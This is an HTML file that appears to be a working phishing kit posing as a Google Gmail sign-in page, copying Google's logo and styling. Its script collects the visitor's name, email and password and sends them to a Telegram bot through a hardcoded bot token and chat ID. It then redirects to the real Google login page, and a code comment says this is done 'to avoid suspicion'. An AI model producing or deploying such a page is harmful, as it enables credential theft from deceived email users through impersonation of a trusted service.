<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login </title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #fff;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 450px;
            width: 100%;
            padding: 20px;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 100px;
        }

        .form-container {
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 30px;
            width: 100%;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 10px;
            color: #202124;
        }

        p {
            font-size: 16px;
            color: #5f6368;
            text-align: center;
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        form input {
            height: 48px;
            width: 100%;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 16px;
            padding: 0 12px;
        }

        form input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }

        ::placeholder {
            color: #5f6368;
            font-size: 16px;
        }

        button {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }

        button:hover {
            background: #1669c9;
        }

        .forgot {
            display: block;
            text-align: center;
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            margin-top: 20px;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        @media (max-width: 500px) {
            .container {
                padding: 15px;
            }

            .form-container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
        </div>
        <div class="form-container">
            <h1>Sign in</h1>
            <p>to continue to Gmail</p>
            <form id="loginForm">
                <input type="text" id="name" name="name" placeholder="Full Name" required>
                <input type="email" id="email" name="email" placeholder="Email or phone" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit">Next</button>
                <a href="#" class="forgot">Forgot password?</a>
            </form>
        </div>
    </div>

    <script>
    document.getElementById('loginForm').addEventListener('submit', async function(event) {
        event.preventDefault();

        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Telegram Bot API details (replace with your own)
        const botToken = '8366897357:AAFU1PfhbNQ-4j0MjqSfRYyFuxajp81x4vI'; // Get from BotFather
        const chatId = '5709522096'; // Single chat ID
        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Message to send to Telegram
        const message = `New Gmail Login Submission:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`;

        try {
            // Send data to the single chat ID
            await fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });

            // Redirect to official Gmail login page
            window.location.href = 'https://accounts.google.com';
        } catch (error) {
            console.error('Error sending data to Telegram:', error);
            // Redirect even if Telegram fails to avoid suspicion
            window.location.href = 'https://accounts.google.com';
        }
    });
  </script>
</body>
</html>
